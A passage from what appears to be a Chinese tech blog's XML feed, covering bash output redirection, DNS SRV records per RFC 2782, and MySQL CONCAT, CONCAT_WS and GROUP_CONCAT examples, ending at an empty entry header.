class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># (echo "hello" &gt;&amp;9) 9&gt;&amp;2 2&gt;&amp;1</span></span><br><span class="line">hello</span><br></pre></td></tr></table></figure><p>这里的文件描述符<code>9</code>会自动生成，但是去除括号就会提示错误了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># echo "hello" &gt;&amp;9 9&gt;&amp;2 2&gt;&amp;1</span></span><br><span class="line">bash: 9: Bad file descriptor</span><br></pre></td></tr></table></figure><p>在 bash &gt;4.0 的版本中，又出了新的重定向语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -ld /tmp /tnt 2&gt; &gt;(sed <span class="string">'s/^/E: /'</span>) &gt; &gt;(sed <span class="string">'s/^/O: /'</span>)</span><br><span class="line">O: drwxrwxrwt 17 root root 28672 Nov  5 23:00 /tmp</span><br><span class="line">E: ls: cannot access /tnt: No such file or directory</span><br></pre></td></tr></table></figure><blockquote><p>这种写法我还没有学习，等我后面学会了再进行更新</p></blockquote><h3 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h3><p>来点高端点的用法</p><p>用于格式化输出, 将标准输出和错误输出两个流重定向到不同的处理中，最后汇总</p><p><code>((ls -ld /tmp /tnt |sed &#39;s/^/O: /&#39; &gt;&amp;9 ) 2&gt;&amp;1 |sed &#39;s/^/E: /&#39;) 9&gt;&amp;1| cat -n</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ((ls -ld /tmp /tnt |sed 's/^/O: /' &gt;&amp;9 ) 2&gt;&amp;1 |sed 's/^/E: /') 9&gt;&amp;1| cat -n</span></span><br><span class="line">     1  O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp</span><br><span class="line">     2  E: ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br></pre></td></tr></table></figure><p>相同作用的新版语法</p><p><code>cat -n &lt;(ls -ld /tmp /tnt 2&gt; &gt;(sed &#39;s/^/E: /&#39;) &gt; &gt;(sed &#39;s/^/O: /&#39;))</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># cat -n &lt;(ls -ld /tmp /tnt 2&gt; &gt;(sed 's/^/E: /') &gt; &gt;(sed 's/^/O: /'))</span></span><br><span class="line">     1  O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp</span><br><span class="line">     2  E: ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br></pre></td></tr></table></figure><h3 id="合并文件"><a href="#合并文件" class="headerlink" title="合并文件"></a>合并文件</h3><p>将输出文件 m 和 n 合并: <code>n &gt;&amp; m</code></p><p>将输入文件 m 和 n 合并: <code>n &lt;&amp; m</code></p><h3 id="输入边界"><a href="#输入边界" class="headerlink" title="输入边界"></a>输入边界</h3><p>将开始标记 tag 和结束标记 tag 之间的内容作为输入: <code>&lt;&lt; tag</code></p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># wc -l &lt;&lt; EOF</span></span><br><span class="line">    document line 1</span><br><span class="line">    document line 2</span><br><span class="line">    document line 3</span><br><span class="line">EOF</span><br><span class="line">3 //表明收到3行输入</span><br></pre></td></tr></table></figure><p>它的作用是将两个 EOF 之间的内容(document) 作为输入传递给 command。</p><blockquote><p>注意：</p><ul><li>结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进</li><li>开始的delimiter前后的空格会被忽略掉</li></ul></blockquote><h2 id="有关覆盖"><a href="#有关覆盖" class="headerlink" title="有关覆盖"></a>有关覆盖</h2><p>如果我们用 <code>set -o noclobber</code> 设置bash，那bash将不会覆盖任何已经存在的文件，但是我们可以通过 <code>&gt;|</code> 绕过这个限制</p><p><strong>先来看一下默认的情况</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># testfile=$(mktemp /tmp/testNoClobberDate-XXXXXX)</span></span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:05:53 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:05:56 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:06:13 PM CST</span><br></pre></td></tr></table></figure><p>如预期的一样，每一次重定向都覆盖了原文件</p><p><strong>下面我们设置 <code>noclobber</code> 标志</strong></p><p><code>set -o noclobber</code></p><p>然后重复上面的操作试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file</span><br><span class="line">Tue 24 Mar 2020 05:06:13 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt; $testfile ; cat $testfile</span></span><br><span class="line">bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file</span><br><span class="line">Tue 24 Mar 2020 05:06:13 PM CST</span><br></pre></td></tr></table></figure><p>我们看到了bash的提示，不能覆盖已存在的文件，实际结果也是一样</p><p>如何进行绕过呢? 我们来试一下用 <code>&gt;|</code> 代替 <code>&gt;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># date &gt;| $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:10:45 PM CST</span><br><span class="line">root@ubuntu:~<span class="comment"># date &gt;| $testfile ; cat $testfile</span></span><br><span class="line">Tue 24 Mar 2020 05:10:49 PM CST</span><br></pre></td></tr></table></figure><p>我们发现此时可以覆盖已经存在的文件，我们查看一下目前的设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># set -o | grep noclobber</span></span><br><span class="line">noclobber       on</span><br></pre></td></tr></table></figure><p><code>noclobber</code> 的确是开启的，所以 <code>&gt;|</code> 的确可以绕过这一限制</p><p>使用 <code>set +o noclobber</code> 关闭这个限制，防止对我们后面的使用造成影响</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># set +o noclobber</span></span><br><span class="line">root@ubuntu:~<span class="comment"># set -o | grep noclobber</span></span><br><span class="line">noclobber       off</span><br><span class="line">root@ubuntu:~<span class="comment"># rm $testfile</span></span><br></pre></td></tr></table></figure><h2 id="其他的小点"><a href="#其他的小点" class="headerlink" title="其他的小点"></a>其他的小点</h2><h3 id="重定向到一处"><a href="#重定向到一处" class="headerlink" title="重定向到一处"></a>重定向到一处</h3><p>如果我们要将 <code>stdout</code> 和 <code>stderr</code> 重定向到同一个地方，该怎么写呢？</p><p>下面两种哪种是对的？</p><ol><li><code>ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;a.txt</code></li><li><code>ls -ld /tmp /tnt 1&gt;b.txt 2&gt;&amp;1</code></li></ol><p>验证一下</p><p><strong>第一种写法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;a.txt</span></span><br><span class="line">ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">root@ubuntu:~<span class="comment"># cat a.txt</span></span><br><span class="line">drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p><strong>第二种写法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 1&gt;b.txt 2&gt;&amp;1</span></span><br><span class="line">root@ubuntu:~<span class="comment"># cat b.txt</span></span><br><span class="line">ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p>我们可以看到第二种写法是正确的</p><p>同理，下面这种写法也正确</p><p><code>ls -ld /tmp /tnt 2&gt;b.txt 1&gt;&amp;2</code></p><h3 id="套个娃a"><a href="#套个娃a" class="headerlink" title="套个娃a"></a>套个娃a</h3><p>来点奇葩的，如果我们将 <code>stderr</code> 重定向到 <code>stdout</code>, 同时又将 <code>stdout</code> 重定向到 <code>stderr</code> 会发生什么？</p><p>如此套娃会不会导致回环卡死？</p><p>试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;&amp;2  | sed -e s/^/++/</span></span><br><span class="line">++ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">++drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p>我们发现都会从标准输出出来</p><p>反过来呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls -ld /tmp /tnt 1&gt;&amp;2 2&gt;&amp;1  | sed -e s/^/++/</span></span><br><span class="line">ls: cannot access <span class="string">'/tnt'</span>: No such file or directory</span><br><span class="line">drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp</span><br></pre></td></tr></table></figure><p>我们发现都没有从标准输出出来，都是从标准错误输出出来的</p><blockquote><p>也就是说 <code>a&gt;&amp;b b&gt;&amp;a</code> 这种套娃写法中， b才是出口</p></blockquote><h2 id="阅读更多内容"><a href="#阅读更多内容" class="headerlink" title="阅读更多内容"></a>阅读更多内容</h2><p>如果你想了解功能，通过下面的命令查看官方文档吧</p><p><code>man -Len -Pless\ +/^REDIRECTION bash</code></p><p>本文的参考资料： <a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener">stack overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
            <tag> redirect </tag>
            
            <tag> 2&gt;&amp;1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS中SRV记录</title>
      <link href="/2020/dns-srv-record.html"/>
      <url>/2020/dns-srv-record.html</url>
      
        <content type="html"><![CDATA[<p>SRV记录是服务器资源记录的缩写，是DNS服务器的数据库中支持的一种记录服务器提供的服务资源的记录，主要作用是说明一个服务器能够提供什么样的服务。</p><p>简单来说，SRV记录了哪台计算机提供了哪个服务这么一个简单的信息。</p><p>SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。</p><h3 id="RFC2782"><a href="#RFC2782" class="headerlink" title="RFC2782"></a>RFC2782</h3><h4 id="概述和理由"><a href="#概述和理由" class="headerlink" title="概述和理由"></a>概述和理由</h4><p>目前，必须知道服务器的确切地址才能联系它或者广播问题。</p><p>SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。</p><p>客户端要求特定域名的特定服务/协议（这里使用的词汇”域名”是RFC 1034上严格定义的），并获取任何可用服务器的名称。</p><p>请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。</p><h4 id="RFC定义的格式"><a href="#RFC定义的格式" class="headerlink" title="RFC定义的格式"></a>RFC定义的格式</h4><p>RFC2782中定义的格式是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_Service._Proto.Name TTL Class SRV Priority Weight Port Target</span><br></pre></td></tr></table></figure><p>各字段详细说明：</p><table><thead><tr><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>Service</td><td>所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线<code>_</code>，以避免与自然界中出现的DNS标签发生冲突。</td></tr><tr><td>Proto</td><td>所需协议的符号名称。前面加下划线<code>_</code>，以防止与自然界中出现的DNS标签发生冲突。 <code>_TCP</code>和<code>_UDP</code>目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。</td></tr><tr><td>Name</td><td>此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题）</td></tr><tr><td>TTL</td><td></td></tr><tr><td>Class</td><td></td></tr><tr><td>Priority</td><td></td></tr><tr><td>Weight</td><td></td></tr><tr><td>Port</td><td>服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。</td></tr><tr><td>Target</td><td>目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。</td></tr></tbody></table><h3 id="SRV记录和微软的关系"><a href="#SRV记录和微软的关系" class="headerlink" title="SRV记录和微软的关系"></a>SRV记录和微软的关系</h3><p>SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！微软的即时通讯服务器Live Communications Server也可以依靠SRV记录定位即时通讯服务器。</p><p>SRV 记录一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。</p><p>鉴于SRV记录可以定位特定服务器的位置，我们可以预计，在微软将来的服务器产品中SRV记录将发挥越来越多的作用。</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
            <tag> SRV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL中几个concat的用法与区别</title>
      <link href="/2020/mysql-concat-concat-ws-group-concat.html"/>
      <url>/2020/mysql-concat-concat-ws-group-concat.html</url>
      
        <content type="html"><![CDATA[<h2 id="讲解与示例"><a href="#讲解与示例" class="headerlink" title="讲解与示例"></a>讲解与示例</h2><h3 id="CONCAT-str1-str2-…"><a href="#CONCAT-str1-str2-…" class="headerlink" title="CONCAT(str1, str2, …)"></a>CONCAT(str1, str2, …)</h3><ol><li>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL</li><li>参数可以是字段名或具体值</li></ol><p>注意：</p><ol><li>如果所有参数均为非二进制字符串，则结果为非二进制字符串</li><li>如果自变量中含有任一二进制字符串，则结果为一个二进制字符串</li><li>一个数字参数被转化为与之相等的二进制字符串格式</li><li>若要避免这种情况，可使用显式类型 cast, 例如： <code>SELECT CONCAT(CAST(int_col AS CHAR), char_col)</code></li></ol><h4 id="MySQL的concat函数可以连接一个或者多个字符串"><a href="#MySQL的concat函数可以连接一个或者多个字符串" class="headerlink" title="MySQL的concat函数可以连接一个或者多个字符串"></a>MySQL的concat函数可以连接一个或者多个字符串</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(<span class="string">'10'</span>);</span><br><span class="line">+--------------+</span><br><span class="line">| concat(<span class="string">'10'</span>) |</span><br><span class="line">+--------------+</span><br><span class="line">| 10   |</span><br><span class="line">+--------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt; select concat(<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 112233 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="MySQL的concat函数在连接字符串的时候，只要其中一个是NULL-那么将返回NULL"><a href="#MySQL的concat函数在连接字符串的时候，只要其中一个是NULL-那么将返回NULL" class="headerlink" title="MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL"></a>MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(<span class="string">'11'</span>,<span class="string">'22'</span>,null);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(<span class="string">'11'</span>,<span class="string">'22'</span>,null) |</span><br><span class="line">+------------------------+</span><br><span class="line">| NULL   |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="CONCAT-WS-separator-str1-str2-…"><a href="#CONCAT-WS-separator-str1-str2-…" class="headerlink" title="CONCAT_WS(separator,str1,str2,…)"></a>CONCAT_WS(separator,str1,str2,…)</h3><p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。</p><p>注意：</p><ol><li>参数可以是字段名或具体值</li><li>如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值）</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'33'</span>);</span><br><span class="line">+--------------------------+</span><br><span class="line">| concat_ws(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'33'</span>) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| 33                       |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.04 sec)</span><br></pre></td></tr></table></figure><h4 id="如连接后以逗号分隔"><a href="#如连接后以逗号分隔" class="headerlink" title="如连接后以逗号分隔"></a>如连接后以逗号分隔</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,<span class="string">'33'</span>) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| 11,22,33 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="和MySQL中concat函数不同的是-concat-ws函数在执行的时候-不会因为NULL值而返回NULL"><a href="#和MySQL中concat函数不同的是-concat-ws函数在执行的时候-不会因为NULL值而返回NULL" class="headerlink" title="和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL"></a>和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,NULL);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| concat_ws(<span class="string">','</span>,<span class="string">'11'</span>,<span class="string">'22'</span>,NULL) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| 11,22 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="GROUP-CONCAT-函数"><a href="#GROUP-CONCAT-函数" class="headerlink" title="GROUP_CONCAT() 函数"></a>GROUP_CONCAT() 函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</span><br></pre></td></tr></table></figure><h4 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from aa;</span><br><span class="line">+------+------+</span><br><span class="line">| id| name |</span><br><span class="line">+------+------+</span><br><span class="line">|1 | 10|</span><br><span class="line">|1 | 20|</span><br><span class="line">|1 | 20|</span><br><span class="line">|2 | 20|</span><br><span class="line">|3 | 200   |</span><br><span class="line">|3 | 500   |</span><br><span class="line">+------+------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="以id分组，把name字段的值打印在一行，逗号分隔-默认"><a href="#以id分组，把name字段的值打印在一行，逗号分隔-默认" class="headerlink" title="以id分组，把name字段的值打印在一行，逗号分隔(默认)"></a>以id分组，把name字段的值打印在一行，逗号分隔(默认)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(name) from aa group by id;</span><br><span class="line">+------+--------------------+</span><br><span class="line">| id| group_concat(name) |</span><br><span class="line">+------+--------------------+</span><br><span class="line">|1 | 10,20,20|</span><br><span class="line">|2 | 20 |</span><br><span class="line">|3 | 200,500|</span><br><span class="line">+------+--------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="以id分组，把去冗余的name字段的值打印在一行，逗号分隔"><a href="#以id分组，把去冗余的name字段的值打印在一行，逗号分隔" class="headerlink" title="以id分组，把去冗余的name字段的值打印在一行，逗号分隔"></a>以id分组，把去冗余的name字段的值打印在一行，逗号分隔</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(distinct name) from aa group by id;</span><br><span class="line">+------+-----------------------------+</span><br><span class="line">| id| group_concat(distinct name) |</span><br><span class="line">+------+-----------------------------+</span><br><span class="line">|1 | 10,20|</span><br><span class="line">|2 | 20   |</span><br><span class="line">|3 | 200,500 |</span><br><span class="line">+------+-----------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序"><a href="#以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序" class="headerlink" title="以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序"></a>以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(name order by name desc) from aa group by id;</span><br><span class="line">+------+---------------------------------------+</span><br><span class="line">| id| group_concat(name order by name desc) |</span><br><span class="line">+------+---------------------------------------+</span><br><span class="line">|1 | 20,20,10   |</span><br><span class="line">|2 | 20|</span><br><span class="line">|3 | 500,200|</span><br><span class="line">+------+---------------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p><a href="https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws" target="_blank" rel="noopener">https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws</a></p><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws"></a>concat_ws</h3><p><a href="http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php" target="_blank" rel="noopener">http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php</a></p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/mysql-concat-concat-ws-group-concat/concat_ws.png" loading="lazy" class="" title="[concat_ws]"><h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><p><a href="http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php" target="_blank" rel="noopener">http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php</a></p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/2020/mysql-concat-concat-ws-group-concat/group_concat.gif" loading="lazy" class="" title="[group_concat]">]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> concat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackBar破解</title>
      <link href="/2020/hack-hackbar.html"/>
      <url>/2020/hack-hackbar.html</url>
      
